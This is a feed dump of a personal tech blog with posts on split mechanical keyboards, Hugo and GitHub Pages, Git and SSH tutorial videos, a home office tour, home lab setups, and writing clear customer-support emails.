<p>So, do yourself a favour here. Take note of your current posture. I&rsquo;ll bet that if your hands are on your keyboard that you&rsquo;re slouched over a bit, wrists are at a somewhat weird angle, and if your setup isn&rsquo;t otherwise ergonomically sound you probably have a fair bit of weight on your forearms or elbows. Now, take your keyboard and move it so that the home row for your left hand (e.g. ASDF on a QWERTY layout) is positioned such that your arms is positioned for shoulder width - your upper arm is in line with your body, and your forearm makes a 90 degree angle off of that. No more pressure on your arms, no more awkward wrist angle, no more hunch&hellip; Magical, huh?</p>
<p>This is where a split keyboard comes into the mix.</p>
<h1 id="going-down-the-rabbit-hole">Going down the rabbit hole</h1>
<p>I&rsquo;ve gone through many keyboards over the past couple of decades, of many types&hellip; and mostly crap. I used a cheap Logitech keyboard/mouse combo for quite a while until I learned about NKRO, at which point I moved to.. another crappy Logitech keyboard (a G15) which I thought was the bee&rsquo;s knees. From there, I got into mechanical keyboards with a Steelseries 7g and at that time I was blown away - great NKRO, responsive switches, a nice noise, and no gummy feel. I was hooked!</p>
<p>The downside of the 7g, at that time, was that it was using MX Black switches which have very heavy springs. While this is a huge benefit for FPS gaming, to avoid misclicks, it is <em>exhausting</em> on the fingers for long bouts of typing, or in any game where you&rsquo;re mashing keys for a long period of time (e.g. MMOs). At this time, I was also really into Starcraft, and that&rsquo;s when I stumbled across a popular streamer (at the time) who made use of a keyboard with MX Blue switches. I had found my next love.</p>
<p>Well, I picked up a cheap Coolermaster Quickfire board that used MX Blue switches and I loved it. I used it all the time, but my SO at the time was highly offended by the noise so I had to find something new. That lead me to another Coolermaster Quickfire using MX Red switches - these are linear, so no clickyness. Another great experience, and the MX Red switches reminded me a lot of the MX Blacks in my 7g, but without anywhere near as much force required for key activation.</p>
<p>I missed my noisy, clicky, switches though. I wound up buying yet another Coolermaster board with the thought of &ldquo;well these have both been great so far, let&rsquo;s get another from the same brand&rdquo;, but this time with MX Brown switches (yes, I know&hellip; but I still like them). That keyboard had a few keys flat out die within a few months, so I got another, same deal.. Ugh. I guess quality control isnt' Coolermaster&rsquo;s strong suit. I wound up fixing both of these keyboards years later thanks to some expanded electronics knowledge (some of the traces had broken and needed to be bridged).</p>
<p>Welp, I still wanted mechanical, I wanted clicky, I wanted quiet&hellip; MX Browns were still the logical choice in my mind, so I bought a Das Keyboard 4C. This company has since fallen from grace a bit, but at the time it was a popular brand. I loved this keyboard, still have it, and it still works, but it also got me used to the idea of spending a lot more money on an input device. The build quality was light years beyond the Coolermaster boards - it was heavy, it was quiet, it felt <em>good</em>.</p>
<p>This wound up pushing me even further down the rabbit hole and I started seeing &ldquo;weird&rdquo; keyboards like the Ergodox pop up from time to time, or even more strangely keyboards like the Dactyl Manuform. These looked too weird to be used by a human, but they were also weird enough to be of interest and occupied my mind.</p>
<p>Fast forward another 4 years. I&rsquo;m getting older. Working with shitty ergonomics is taking its toll on my shoulders, wrists, and elbows. It&rsquo;s time for a change. I&rsquo;ve got the standing desk, I&rsquo;ve got the ergnomic chair, I&rsquo;m at a 90/90/90 position, but I still can&rsquo;t shake this shoulder and wrist pain. It was time to try one of those &ldquo;weird&rdquo; split keyboards. I bought a ZSA Moonlander.</p>
<p>HOLY SHIT! It was a fucking epiphany. My life was forever changed.</p>
<p>I can type in a comfortable position? I can remap any key I want? I can have the same key do different things <em>that I choose</em> depending on how I use it? Mind = Blown. Granted, the functionality is thanks to the QMK firmware that&rsquo;s used, which is also available for non-split keyboards, but the combination of that and the ergonomic changes of being able to keep my arms straight out at shoulder width as well as tenting the keyboard to reduce wrist/forearm strain was <em>huge</em>.</p>
<p>Here I am about 6 months into ownership of my Moonlander, nd I&rsquo;m already eying up my next build, though it&rsquo;ll be one for travel purposes as I&rsquo;m very happy with the Moonlander. It&rsquo;ll probably be a Gergo or an Iris (have fun googling those), but I&rsquo;m totally undecided on switches. This journey also lead me to discove r that there are switches other than the Cherry MX line&hellip; Gateron, Holy Pandas, Zeal, Kailh, etc&hellip; Lots to explore, and depending on who you ask, they&rsquo;re all better than anything that Cherry puts out. Oh, and people <em>lube</em> their switches for quieter/cleaner operation - something I didn&rsquo;t know I needed, but now am reasonably sure I can&rsquo;t live without.</p>
<h1 id="tldr">TL;DR?</h1>
<ul>
<li>Normal keyboards have awful ergnomics. Look at a split keyboard.</li>
<li>Membrane keyboards <em>feel</em> awful. Get mechanical switches. Even if it&rsquo;s a cheap board, it&rsquo;ll be a big difference.</li>
<li>The ergnomic and productivity benefits of having a keyboard that uses QMK (or another similar firmware) are huge. Put your keys wherever you want, change their behaviour however you want. Does thinking about taking a screenshot with Command + Option + Shift + 4 make your wrist hurt? Map it to a single key without the need for any additional software on your computer.</li>
<li>Prepare your wallet&hellip;</li>
</ul>
]]></content></item><item><title>Hello via GitHub Pages</title><link>https://www.maclaren.dev/posts/2021-01/github-pages/</link><pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-01/github-pages/</guid><description>Well this is new&amp;hellip; Rather than dealing with Blogger, a dubious mobile interface, and spreading things across many services&amp;hellip; why not just use GitHub Pages? I&amp;rsquo;m so used to writing markdown at this point that it just seems easier ð
Hugo Inspired by tmpdubz I figured I&amp;rsquo;d do a double-whammy here - play around with/learn GitHub Pages, while also giving my blog a much needed cosmetic overhaul/simplification/rebranding. This lead to Hugo, which is pretty darn neat.</description><content type="html"><![CDATA[<h1 id="well-this-is-new">Well this is new&hellip;</h1>
<p>Rather than dealing with Blogger, a dubious mobile interface, and spreading things across many services&hellip; why not just use GitHub Pages? I&rsquo;m so used to writing markdown at this point that it just seems easier ð</p>
<h1 id="hugo">Hugo</h1>
<p>Inspired by <a href="https://github.com/tmpdubz">tmpdubz</a> I figured I&rsquo;d do a double-whammy here - play around with/learn GitHub Pages, while also giving my blog a much needed cosmetic overhaul/simplification/rebranding. This lead to <a href="https://gohugo.io/">Hugo</a>, which is pretty darn neat.</p>
<p>Hugo is reasonably well documented, config driven, and quite intuitive to pick up and run with. Setting up this whole blog system on GitHub Pages took under 15 minutes (not including manually migrating blog content over).</p>
<p>Check it out if you&rsquo;re looking to throw together a simple site! You can check out what a finished project looks like by reviewing what&rsquo;s powering this very blog <a href="https://github.com/maclarel/maclarel.github.io">in my GitHub repo</a>.</p>
]]></content></item><item><title>Git &amp; GitHub Tutorial - Part 2 - Branching, forking, and pull requests</title><link>https://www.maclaren.dev/posts/2020-08/github-tutorial-part-2/</link><pubDate>Sun, 02 Aug 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-08/github-tutorial-part-2/</guid><description>This is part 2 of a Git tutorial series - I recommend watching part 1 @ https://youtu.be/jhgoGnYgPuY first!
In this video we take a look at creating new branches in a Git repository, forking other repositories, and creating pull requests:</description><content type="html"><![CDATA[<p>This is part 2 of a Git tutorial series - I recommend watching part 1 @ <a href="https://youtu.be/jhgoGnYgPuY">https://youtu.be/jhgoGnYgPuY</a> first!</p>
<p>In this video we take a look at creating new branches in a Git repository, forking other repositories, and creating pull requests:</p>
<p><a href="https://www.youtube.com/watch?v=V8vUYUvDSfY"><img src="http://img.youtube.com/vi/V8vUYUvDSfY/0.jpg" alt="GitHub Tutorial - Part 2"></a></p>
]]></content></item><item><title>Git &amp; GitHub Tutorial - Part 1 - Creating &amp; using a Git repository</title><link>https://www.maclaren.dev/posts/2020-07/github-tutorial-part-1/</link><pubDate>Sun, 26 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-07/github-tutorial-part-1/</guid><description>In this video we start to delve into using Git and GitHub to track a project. We will create a repository, clone it, make changes, and push those changes back up to GitHub so that everyone can view them!</description><content type="html"><![CDATA[<p>In this video we start to delve into using Git and GitHub to track a project. We will create a repository, clone it, make changes, and push those changes back up to GitHub so that everyone can view them!</p>
<p><a href="https://www.youtube.com/watch?v=jhgoGnYgPuY"><img src="http://img.youtube.com/vi/jhgoGnYgPuY/0.jpg" alt="GitHub Tutorial - Part 1"></a></p>
]]></content></item><item><title>Key-based Authentication for SSH</title><link>https://www.maclaren.dev/posts/2020-07/key-based-auth-ssh/</link><pubDate>Sun, 19 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-07/key-based-auth-ssh/</guid><description>Tired of trying to remember passwords for every system you access, or annoyed that every system uses the same password? Let&amp;rsquo;s look at a more secure approach that can solve both problems - key based authentication with SSH!</description><content type="html"><![CDATA[<p>Tired of trying to remember passwords for every system you access, or annoyed that every system uses the same password? Let&rsquo;s look at a more secure approach that can solve both problems - key based authentication with SSH!</p>
<p><a href="https://www.youtube.com/watch?v=tSqyTH_QS1I"><img src="http://img.youtube.com/vi/tSqyTH_QS1I/0.jpg" alt="Key-based Auth Tutorial"></a></p>
]]></content></item><item><title>SSH Port Forwarding</title><link>https://www.maclaren.dev/posts/2020-07/ssh-port-forwarding/</link><pubDate>Sun, 19 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-07/ssh-port-forwarding/</guid><description>Have a service that you don&amp;rsquo;t want to directly expose, or that doesn&amp;rsquo;t have good security, that you still need to access? Today we&amp;rsquo;re going to look at using SSH to accomplish this!
This tutorial uses nc, UFW/IPTables, and SSH to demonstrate how to forward any port over an SSH connection on TCP 22. You can extend this to just about any service. For example, this works for accessing websites, or other services that are exposed through a web browser.</description><content type="html"><![CDATA[<p>Have a service that you don&rsquo;t want to directly expose, or that doesn&rsquo;t have good security, that you still need to access? Today we&rsquo;re going to look at using SSH to accomplish this!</p>
<p>This tutorial uses <code>nc</code>, <code>UFW/IPTables</code>, and <code>SSH</code> to demonstrate how to forward any port over an SSH connection on TCP 22. You can extend this to just about any service. For example, this works for accessing websites, or other services that are exposed through a web browser.</p>
<p><a href="https://www.youtube.com/watch?v=hb80XpmLJ1U"><img src="http://img.youtube.com/vi/hb80XpmLJ1U/0.jpg" alt="SSH Port Forwarding"></a></p>
]]></content></item><item><title>Home Office Tour</title><link>https://www.maclaren.dev/posts/2020-07/home-office-tour/</link><pubDate>Sun, 05 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-07/home-office-tour/</guid><description>A quick tour of my full time work-from-home office! I&amp;rsquo;ve been working remote for many years now, and for the past ~18 months I&amp;rsquo;ve been working from home almost exclusively (no more travel).
This is a quick look over the setup that I use every day!
Equipment shown:
Desk: Jarvis Standing Desk Monitor: LG 38UC99-W Monitor Arm: Amazon Basics Premium Mouse: Logitech MX Master Keyboard: Das Keyboard 4C Professional (MX Brown) Laptop Stand: Rain Design mStand Dock: CalDigit TS3 Plus Chair: HÃG Capisco Puls Standing mat: Ergodriven Topo</description><content type="html"><![CDATA[<p>A quick tour of my full time work-from-home office! I&rsquo;ve been working remote for many years now, and for the past ~18 months I&rsquo;ve been working from home almost exclusively (no more travel).</p>
<p>This is a quick look over the setup that I use every day!</p>
<p>Equipment shown:</p>
<ul>
<li>Desk: Jarvis Standing Desk</li>
<li>Monitor: LG 38UC99-W</li>
<li>Monitor Arm: Amazon Basics Premium</li>
<li>Mouse: Logitech MX Master</li>
<li>Keyboard: Das Keyboard 4C Professional (MX Brown)</li>
<li>Laptop Stand: Rain Design mStand</li>
<li>Dock: CalDigit TS3 Plus</li>
<li>Chair: HÃG Capisco Puls</li>
<li>Standing mat: Ergodriven Topo</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=blZYivfDoDs"><img src="http://img.youtube.com/vi/blZYivfDoDs/0.jpg" alt="Home Office Walkthrough"></a></p>
]]></content></item><item><title>Home lab updates</title><link>https://www.maclaren.dev/posts/2020-04/home-lab-updates/</link><pubDate>Wed, 22 Apr 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-04/home-lab-updates/</guid><description>Following up from my &amp;ldquo;Starting out with a home lab&amp;rdquo; article I&amp;rsquo;ve made some pretty nice updates to my home lab setup, and I&amp;rsquo;ve also got my {Ansible playbooks](https://github.com/maclarel/ansible_playbooks) up on GitHub now!
Starting out with the lab additions:
Gigabit internet (Cable, unfortunately) recently became available here, so I&amp;rsquo;ve now got a 1000/30 connection! Upload speeds are depressing, but still 3x the speed I had previously! UniFi Dream Machine has taken over my network.</description><content type="html"><![CDATA[<p>Following up from my &ldquo;Starting out with a home lab&rdquo; article I&rsquo;ve made some pretty nice updates to my home lab setup, and I&rsquo;ve also got my {Ansible playbooks](<a href="https://github.com/maclarel/ansible_playbooks">https://github.com/maclarel/ansible_playbooks</a>) up on GitHub now!</p>
<p>Starting out with the lab additions:</p>
<ul>
<li>Gigabit internet (Cable, unfortunately) recently became available here, so I&rsquo;ve now got a 1000/30 connection! Upload speeds are depressing, but still 3x the speed I had previously!</li>
<li><a href="https://store.ui.com/collections/unifi-network-routing-switching/products/unifi-dream-machine">UniFi Dream Machine</a> has taken over my network. This thing is literally stepping forward 15 years in terms of technology over what I was previously using&hellip;</li>
<li><a href="https://store.ui.com/collections/wireless/products/unifi-nanohd-us?_pos=1&amp;_sid=b2cf06452&amp;_ss=r">UniFi NanoHD Access Point</a> for improved network connectivity on the second floor of my house. Dramatic improvement in connection quality!
And perhaps most importantly, the whole layout is now more A E S T H E T I C&hellip;</li>
</ul>
<p>Before:</p>
<p><img src="https://i.redd.it/wbluzsg4nvt41.jpg" alt="oldandbusted"></p>
<p>After:</p>
<p><img src="https://i.imgur.com/1tjFzgF.jpg" alt="newhotness"></p>
<p>Significant improvements all around!</p>
]]></content></item><item><title>Written communication for Support</title><link>https://www.maclaren.dev/posts/2020-04/written-communication-for-support/</link><pubDate>Sun, 12 Apr 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-04/written-communication-for-support/</guid><description>I&amp;rsquo;ve been working in customer facing roles for quite a while now. Granted, these have largely had the luxury of being in software companies, but I&amp;rsquo;ve also done a brief retail stint and I&amp;rsquo;d like to think the same skills apply in all cases.
While this will be by no means exhaustive, I want to go over two high-level concepts that I feel are extremely important, and can sometimes be overlooked even by veterans in customer facing positions.</description><content type="html"><![CDATA[<p>I&rsquo;ve been working in customer facing roles for quite a while now. Granted, these have largely had the luxury of being in software companies, but I&rsquo;ve also done a brief retail stint and I&rsquo;d like to think the same skills apply in all cases.</p>
<p>While this will be by no means exhaustive, I want to go over two high-level concepts that I feel are extremely important, and can sometimes be overlooked even by veterans in customer facing positions.</p>
<h1 id="managing-expectations">Managing Expectations</h1>
<p>This may sound simple, and it is a straight forward concept, but it&rsquo;s all too oft ignored. We&rsquo;ll dive into some examples below as to how easy it is to really nail this and create a great customer experience.</p>
<h2 id="setting-expectations">Setting Expectations</h2>
<p>Have you ever received this email when working with a company?</p>
<pre><code>Hi &lt;Name&gt;,

Thanks for reaching out for assistance!

We understand that you're encountering problem &lt;X&gt; which is blocking your work. Thanks so much for providing the steps to reproduce this problem! I'll see if I can reproduce this problem here, and will be in touch.

Regards,
&lt;Friendly Support Person&gt;
</code></pre><p>Hmmmm&hellip; What&rsquo;s wrong here?</p>
<ul>
<li>The person asking for help is politely acknowledged and greeted.</li>
<li>The problem is restarted for clarity, including acknowledging the severity of the issue.</li>
<li>The reproducible testcase is acknowledged.</li>
<li>Next steps are specified.</li>
<li>There&rsquo;s a friendly closing.</li>
</ul>
<p>Can&rsquo;t put your finger on it? There&rsquo;s no timeline associated with the next steps!</p>
<p>This seems pretty minor, but let&rsquo;s flesh this scenario out a little bit, and let&rsquo;s say that I&rsquo;m the person asking for assistance. I&rsquo;ve clearly run into a problem and it&rsquo;s significant enough that I&rsquo;ve taken the time to send in a request for assistance because I can&rsquo;t progress on my work. It&rsquo;s wonderful that I&rsquo;ve reached someone willing to help, and that they understand the problem at a high enough level to paraphrase it, but now I&rsquo;m left with absolutely no understanding of when I&rsquo;ll hear back.</p>
<p>You may be reading this and think that the next steps are solely with the person troubleshooting the problem on the Support side, but you&rsquo;d be partially wrong. With no firm timeline established, the affected user who submitted the ticket also has to proactively reach out to Support if they need an update, since they don&rsquo;t know when they&rsquo;ll hear back. This makes for a poor customer experience since they&rsquo;re left wondering if they&rsquo;re going to hear back in an hour, a day, a week, or never.</p>
<p>All to often I&rsquo;ll see this scenario play out, even with industry veterans, and almost without fail the very next entry in the ticket (regardless of timeline) is from the customer saying &ldquo;Any updates?&rdquo;.</p>
<p>Let&rsquo;s do a small tweak, and outline the impact it has:</p>
<pre><code>Hi &lt;Name&gt;,

Thanks for reaching out for assistance!

We understand that you're encountering problem &lt;X&gt; which is blocking your work. Thanks so much for providing the steps to reproduce this problem! I'll see if I can reproduce this problem here, and will provide you with an update by close of business tomorrow. 

Regards,
&lt;Friendly Support Person&gt;
</code></pre><p>All we&rsquo;ve done here is provide a timeline of getting a response by the end of the following day, but let&rsquo;s dive into what that entails:</p>
<ul>
<li>The customer now knows when they&rsquo;ll receive next contact, so they know they don&rsquo;t need to follow up before then unless something changes.</li>
<li>This gives the customer a clear path to update the ticket owner on changing priorities. For example, is this actually blocking their whole team and not just them? Is there a business critical function that needs to happen by the end of the same day, meaning tomorrow is too late?</li>
<li>The ticket owner now has an obligation to address the issue on the timeline they&rsquo;ve specified, meaning they can better prioritize, instead of just throwing the issue into their (potentially large) backlog.</li>
</ul>
<h2 id="resetting-expectations">Resetting Expectations</h2>
<p>In a perfect world, the severity of the problem in the example above was well communicated and ticket owner would provide a material update before the close of business the following day. Great, case closed (or at least notably progressed), but we all know that&rsquo;s not always what happens.</p>
<p>Let&rsquo;s talk about resetting expectations that were set.</p>
<p>Things change. The customer who submitted that example ticket isn&rsquo;t the only person having problems. Let&rsquo;s assume for a moment that the ticket owner got hit with a much more important problem - like another customer being completely down and blocked - and they haven&rsquo;t had time to address our example problem.</p>
<p>There are two likely scenarios, and outcomes, of this.</p>
<h3 id="scenario-1----the-ticket-does-not-receive-an-update-before-close-of-business-the-following-day">Scenario 1 -  The ticket does not receive an update before close of business the following day</h3>
<p>This is the most common scenario I see from less experienced folks. Unfortunately, it tends to drive a far more negative outcome than you may expect at face value. Fortunately, it&rsquo;s a very easy problem to address!</p>
<p>Having dealt with customers as a front-line customer support person, an escalation point, a team lead, a main point-of-contact, and as a direct customer advocate, for almost 14 years I can quite comfortably tell you that the #1 cause of customer frustration is not receiving timely updates.</p>
<p>In this case, the customer is left without any information as to the status of their request and feels ignored. It&rsquo;s a safe bet that (assuming they haven&rsquo;t given up) that ticket owner is going to come in the next morning and see &ldquo;Any updates?&rdquo; front and center on that ticket. The customer won&rsquo;t be happy.</p>
<h3 id="scenario-2---the-ticket-is-updated-before-the-close-of-business-the-following-day-saying-that-theres-no-progress">Scenario 2 - The ticket is updated before the close of business the following day saying that there&rsquo;s no progress</h3>
<p>Prior to the end of the following day, the ticket owner sends off this update:</p>
<pre><code>Hi &lt;Name&gt;,

I just wanted to send you an update to note that I'm still looking into this here. I'll be in touch ASAP with next steps.

Regards,
&lt;Friendly Support Person&gt;
</code></pre><p>We&rsquo;re making progress with this, but still not perfect! Let&rsquo;s take a look at Scenario 3 for how we can reliable salvage this.</p>
<h3 id="scenario-3---the-ticket-is-updated-and-expectations-are-reset">Scenario 3 - The ticket is updated, and expectations are reset</h3>
<p>All we&rsquo;re going to do here is a minor tweak to the wording above. This will let us reset expectations with the customer and keep the next steps entirely on the Support side (save for a possible escalation).</p>
<pre><code>Hi &lt;Name&gt;,

I just wanted to send you an update to note that I'm still looking into this here. I'll be looking into this first thing tomorrow morning and will provide you with an update by mid-day tomorrow.

Regards,
&lt;Friendly Support Person&gt;
</code></pre><p>The customer has been informed of the delay, understands the prioritization moving forward, and knows to expect an update at the discussed time. This, in general, will keep them happy!</p>
<h2 id="further-breakdown">Further breakdown</h2>
<p>Obviously there&rsquo;s nuance to this, but as discussed above this is the most common cause for ticket escalations and overall poor customer experience. Overall length of time to (successfully) close a ticket is a distant second in terms of drivers for negative customer satisfaction behind a lack of communication.</p>
<p>While this scenario can be intimidating, I&rsquo;ll also not that you&rsquo;re significantly less likely to get directly negative feedback from a customer when providing a wrong answer, as long as it&rsquo;s done in a timely fashion and leaves the door open for them to follow-up with you.</p>
<h1 id="professional-written-communication">Professional Written Communication</h1>
<p>I&rsquo;ll start out by noting that there&rsquo;s a difference between formal communication and professional communication. A lot of this will come down to the company that you&rsquo;re working with, and the &ldquo;voice&rdquo; that they are trying to present. For the sake of this section, we&rsquo;re not discussing formal writing as that&rsquo;s it&rsquo;s own skill in many cases.</p>
<p>To start out with, this is not intended to &ldquo;shame&rdquo; anyone who is not a native speaker of whatever language they are communicating in. English, in particular, is a disaster of a language and (in my opinion) it&rsquo;s reasonably ignorant to judge someone based on their grasp of a non-native language. If you fall into this bucket, I&rsquo;d strongly recommend the use of a Linter to help catch spelling and grammatical issues, such as linter-write-good for Atom.</p>
<p>With that out of the way, the high-level things we want to note here are:</p>
<ul>
<li>Organization of thoughts</li>
<li>Clear and concise wording</li>
<li>Proper punctuation, spelling, and grammar</li>
</ul>
<h2 id="organizing-your-thoughts">Organizing your Thoughts</h2>
<p>Issues can be complex, and responses can necessitate jumping between multiple logical scenarios. When you find yourself in this scenario, it can be very helpful to include things like headers (for example, the &ldquo;Organizing your Thoughts&rdquo; header here) to more clearly define context.</p>
<p>Similarly, it can be helpful to have a very high level summary, sometimes using bullet points or a numbered list, to specifically outline the information that will be further discussed&hellip; as we&rsquo;ve also done here.</p>
<p>Clear and Concise Wording</p>
<p>Time is valuable. If you can clearly, and politely, communicate a thought in two sentences instead of two paragraphs, do it. I&rsquo;ll provide examples of good, and bad, responses below. We&rsquo;ll strip the pleasantries since we&rsquo;re just focusing on content.</p>
<h3 id="example-1">Example 1</h3>
<pre><code>I can see that in function findTheThing you've used a brute-force search across the array to find duplicate values. This type of approach is quite inefficient with large data sets.

You may want to consider loading values into a set for evaluation as this will likely perform much better.
</code></pre><h3 id="example-2">Example 2</h3>
<pre><code> I can see that in function findTheThing you've used a brute-force search across the array to find duplicate values. While a brute-force search is simple to implement, and will always find a solution if it exists, its cost is proportional to the number of candidate solutions â which in many practical problems tends to grow very quickly as the size of the problem increases 

You may want to consider loading values into a set for evaluation as this will likely perform much better. A set will allow you to only store the required values until a duplicate is found, which will likely result in significantly smaller memory utilization.
</code></pre><p>I&rsquo;ll note that both of these are completely valid responses that most customers would be happy to receive. In order to keep you, the reader of this article, paying attention I&rsquo;ve limited the verbosity that could have otherwise been included in <code>Example 2</code>.</p>
<p>At the end of the day here, you&rsquo;ll need to know your audience. In the example above, if it&rsquo;s safe to assume that your reader knows what a set is from a computer science perspective there&rsquo;s probably no need to explain how it should be implemented, or how it will differ from a brute-force search of an entire array.</p>
<h2 id="punctuation-spelling-and-grammar">Punctuation, Spelling, and Grammar</h2>
<p>I&rsquo;m not going to dive into whether or not you should use Oxford commas, or try to note that you need to ensure you have sentence structure that your 10th grade English teacher would give you an A+ on. The goal here is to be legible, avoid ambiguity, and avoid reader frustration.</p>
<ul>
<li>Use paragraphs to logically divide thoughts.</li>
<li>Avoid run-on sentences.</li>
<li>Know the difference between your/you&rsquo;re, its/it&rsquo;s, there/their/they&rsquo;re, etc.
<ul>
<li>Again, a Linter will help here if you&rsquo;re not a native English speaker.</li>
</ul>
</li>
<li>Proof-read your messages.</li>
</ul>
<p>I&rsquo;ll paraphrase a message I received recently which I think is a prime example of how not to write something.</p>
<pre><code>Hi Logan,

Hope you are doing well,

I see you have a problem and I would be more than happy to help you fix this problem that you described in your original message.

Please can you send me the following information - what version you are using, what operating system you are using for example Windows or Mac, and what browser? These information's will help to resolve your issue more quickly so it would be very helpful if you can provide them quickly thanks!

Regards,
&lt;Name&gt;
</code></pre><p>I actually cringed when reading the message that inspired this&hellip; and while writing this. Can I understand what they need? Absolutely. Did I have to re-read this a few times to understand? You bet.</p>
<p>As a &ldquo;fun&rdquo; exercise, try rewriting this in the comments below and see if you can clean it up!</p>
<h1 id="wrapping-up">Wrapping up</h1>
<p>I know that this all seems very basic, and it is, but it&rsquo;s the kind of thing where practice makes perfect. It&rsquo;s also very easy to get into bad habits like not proof-reading messages before sending or not providing enough information in responses. Experience certainly helps.</p>
<p>There are many other concepts we could discuss, and maybe they&rsquo;ll be done so in another post, but I&rsquo;ll leave you all with one final recommendation:</p>
<p>If you are providing someone with technical instructions, be sure to test the instructions first or specifically outline if they have not been tested. Nothing is worse than being on the receiving end of something that doesn&rsquo;t work at all when dealing with an &ldquo;expert&rdquo;. Mistakes certainly happen, but this one can generally be avoided pretty easily.</p>
]]></content></item><item><title>Starting out with a home lab</title><link>https://www.maclaren.dev/posts/2020-04/starting-out-with-a-home-lab/</link><pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2020-04/starting-out-with-a-home-lab/</guid><description>Why do I want a home lab? While only you, the reader, can answer this, there are many reasons that I&amp;rsquo;ve build one out. I imagine your reasoning will be similar.
There are things you want to have, or automate, that are simply obnoxious otherwise. You&amp;rsquo;ve got specific technologies that you want to explore without a full scale investment. You&amp;rsquo;re working toward certifications (or hands-on experience) with technologies that you want to be using for work.</description><content type="html"><![CDATA[<h1 id="why-do-i-want-a-home-lab">Why do I want a home lab?</h1>
<p>While only you, the reader, can answer this, there are many reasons that I&rsquo;ve build one out. I imagine your reasoning will be similar.</p>
<ul>
<li>There are things you want to have, or automate, that are simply obnoxious otherwise.</li>
<li>You&rsquo;ve got specific technologies that you want to explore without a full scale investment.</li>
<li>You&rsquo;re working toward certifications (or hands-on experience) with technologies that you want to be using for work.</li>
</ul>
<p>Personally, I just want to tinker. I&rsquo;m very lucky to have access to all of the tooling I need for my day job through work. With that said, there&rsquo;s a lot that I want to play with outside of that scope as well as many &ldquo;quality of life&rdquo; improvements that I want for my home network such as:</p>
<ul>
<li>Ad-blocking</li>
<li>In-home media storage &amp; streaming</li>
<li>On-site Backups</li>
<li>Home &amp; network security</li>
<li>Tinkering and learning</li>
</ul>
<h1 id="but-i-dont-have-a-server">But I don&rsquo;t have a server!</h1>
<p>The biggest misconception that people have about setting up a home lab is that they need to run out and buy a used Dell R710 (or something similar), load it with hard drives, and install <a href="https://www.proxmox.com/">Proxmox</a> or <a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/esxi-and-esx.html.html">ESXi</a> just to get started.</p>
<p>Let&rsquo;s talk about the reality. Do you have an old  laptop? Maybe an old gaming rig that you recently replaced? Cool! Ignore the rack-mounted server as you&rsquo;re 100% ready to get started.</p>
<p>While Proxmox and ESXi are both awesome and great platforms to build your home lab on, you don&rsquo;t need them to test the waters. Regardless of what platform you&rsquo;re on, you can build VMs with <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox</a>, or if you&rsquo;re on Windows (10 or Server) specifically you can use <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">HyperV</a> (<a href="https://www.thedatanewbie.com/2018/04/tutorial-set-up-linux-vm-on-windows.html">which I did a tutorial on a while back</a>. Lastly, you&rsquo;ve got the ability across all of these platforms to play with containerization with <a href="https://www.docker.com/">Docker</a> or <a href="https://kubernetes.io/">Kubernetes</a>.</p>
<p>While we won&rsquo;t dive into the details of each of these technologies here, the point is simply that all of this is already available for you to work with and learn even if it&rsquo;s on a 10 year old Dell desktop you bought from a library!</p>
<p>If you <em>really</em> don&rsquo;t have what you need here, there are tons of trial options with services like Amazon AWS EC2 or the free tier of Google Cloud Platform, not to mention things like partner codes for discounts with companies like <a href="https://www.linode.com/">Linode</a>.</p>
<h1 id="what-does-my-home-lab-look-like">What does my home lab look like?</h1>
<p>Building off of the info above, I don&rsquo;t have an &ldquo;impressive&rdquo; home lab by any stretch, but it still does everything I need. If IaaS isn&rsquo;t your thing, and you don&rsquo;t have a computer to play around with, you can pertty easily build out the same setup I&rsquo;m using for under $500CDN all-in.</p>
<h2 id="my-lab">My &ldquo;lab&rdquo;</h2>
<ul>
<li>CPU - i5 4670k</li>
<li>RAM -  16GB DDR3</li>
<li>Storage - 256GB SSD, 2TB HDD, 2x 1TB HDD (RAID-1)</li>
<li>NAS Storage - NetGear ReadyNAS NV+ w/ 4x 1.5TB HDD (RAID-5)</li>
<li>Router - ASUS RT-N66U</li>
<li>Switch - Unmanaged 8-port Gbit &amp; 24-port 100Mbit switches</li>
</ul>
<p>Yep, this is all old and busted&hellip; and it runs Windows 10.</p>
<p>The CPU is 7 years old, and both the RAM and HDDs were bought used. The NAS is 10 years old and can&rsquo;t handle transfer speeds above 15MB/s despite having a 1Gbit NIC.</p>
<p>But you know what? This setup still does everything I need. You can buy a comparable PC + hard drives for around $350CDN, and I got that NAS with its drives for $100 and a bottle of wine.</p>
<h1 id="what-do-i-use-that-junk-listed-above-to-do">What do I use that junk listed above to do?</h1>
<p>I&rsquo;ll start by noting that I&rsquo;m a hobbyist in this space. I use this setup to tinker and to handle some specific usecases for my home, as well as general learning. I&rsquo;d be pretty happy to recommend this setup for any low(er) level IT certification training, and it&rsquo;s absolutely sufficient as a development/testing environment across a variety of operating systems.</p>
<p>With that out of the way, here&rsquo;s what I&rsquo;m using this setup for:</p>
<ul>
<li>4x Ubuntu Server VMs running under Hyper-V
<ul>
<li>ELK - Collecting system metrics and DNS info from all VMs</li>
<li>Plex - Serving up media content (720p/1080p CPU transcoding)</li>
<li>PiHole - Blocking adds and obnoxious traffic from my network.</li>
<li>Ansible - Configuration management and automating updates across all of my VMs</li>
</ul>
</li>
<li>2x RHEL VMs for certification training/tinkering</li>
<li>OpenVPN server into my home network</li>
<li>Torrenting &ldquo;Linux ISOs&rdquo;</li>
<li>Securing outgoing network traffic over VPN</li>
<li>NAS
<ul>
<li>Backups from all machines on my network (via OS tooling or rsync)</li>
<li>Media storage (music, video, software, etc.)</li>
</ul>
</li>
</ul>
